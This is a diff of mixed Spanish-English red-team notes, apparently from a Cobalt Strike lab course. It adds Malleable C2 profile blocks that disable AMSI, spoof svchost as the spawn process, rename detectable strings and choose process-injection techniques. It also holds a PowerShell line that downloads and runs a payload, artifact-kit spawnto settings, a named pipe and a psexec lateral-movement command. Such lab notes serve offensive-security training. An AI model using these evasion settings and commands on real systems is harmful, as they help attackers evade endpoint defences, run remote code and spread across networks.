@@ -13,9 +13,6 @@ $LangList.Add("es-ES")
 Set-WinUserLanguageList $LangList -Force
 ```
 > Vamos a language settings(escribes "**la**" en windows) y seleccionas español.
-
-
-
 # EVASION
 
 ## AMSI BYPASS, lanzarlos por separado.
@@ -109,31 +106,39 @@ cd /opt/cobaltstrike/profiles
 ```
 4. Open **default.profile** in a text editor (e.g. vim or nano).
 5. Add the following stage block:
+
 ```c
 stage {
    set userwx "false";
-   set module_x64 "Hydrogen.dll";  # use a different module if you like
+   set module_x64 "Hydrogen.dll";  
    set copy_pe_header "false";
 }
-```
 
-6. Add the following post-ex block:
-```c
 post-ex {
-  set amsi_disable "true";
-  set spawnto_x64 "%windir%\\sysnative\\svchost.exe";
-  set obfuscate "true";
-  set cleanup "true";
-
-  transform-x64 {
-      strrep "ReflectiveLoader" "NetlogonMain";
-      strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Assembly threw an exception";
-      strrepex "PowerPick" "PowerShellRunner" "PowerShellEngine";
-
-      # add any other transforms that you want
-  }
+	set amsi_disable "true";
+	set spawnto_x64 "%windir%\\sysnative\\svchost.exe";
+	set obfuscate "true";
+	set cleanup "true";
+	set smartinject "true";
+	
+	transform-x64 {
+		      strrep "ReflectiveLoader" "NetlogonMain";
+		      strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Assembly threw an exception";
+		      strrepex "PowerPick" "PowerShellRunner" "PowerShellEngine";
+		  }
 }
+
+process-inject {
+	   execute {
+	      NtQueueApcThread-s;
+	      NtQueueApcThread;
+	      SetThreadContext;
+	      RtlCreateUserThread;
+	      CreateThread;
+	   }
+	}
 ```
+
 7. Save the changes.
 8. Restart the team server.
 ```bash
@@ -142,6 +147,11 @@ sudo /usr/bin/docker restart cobaltstrike-cs-1
 If the container fails to restart properly use to see the profile errors:
 ```bash
 sudo /usr/bin/docker logs cobaltstrike-cs-1
+```
+
+```bash
+#pipename
+TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
 ```
 
 ## Testing
@@ -167,7 +177,7 @@ Folder: C:\Payloads
 > DisableRealtimeMonitoring should return as False.
 6. Download and invoke the PowerShell payload.
 ```powershell
-iex (new-object net.webclient).downloadstring("http://www.bleepincomputer.com/test")
+iex(new-object net.webclient).downloadstring("http://www.bleepincomputer.com/test")
 ```
 7. Switch back to [Attacker Desktop](https://labclient.labondemand.com/Instructions/a28ce94c-f300-4fca-93fd-594ac13bc4e9#) and a new Beacon should be checking in.
 8. From the new Beacon, impersonate a local admin to _lon-ws-1_.
@@ -345,3 +355,17 @@ C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe .\test.csproj
 3. Ejecutas -> C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe .\test.csproj
 ```
 
+## OPSEC
+
+```bash
+ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
+ak-settings spawnto_x86 C:\Windows\SysWOW64\svchost.exe
+
+beacon> ak-settings
+[*] artifact kit settings:
+[*]    service     = ''
+[*]    spawnto_x86 = 'C:\Windows\SysWOW64\svchost.exe'
+[*]    spawnto_x64 = 'C:\Windows\System32\svchost.exe'
+
+beacon> jump psexec64 lon-ws-1 smb
+```
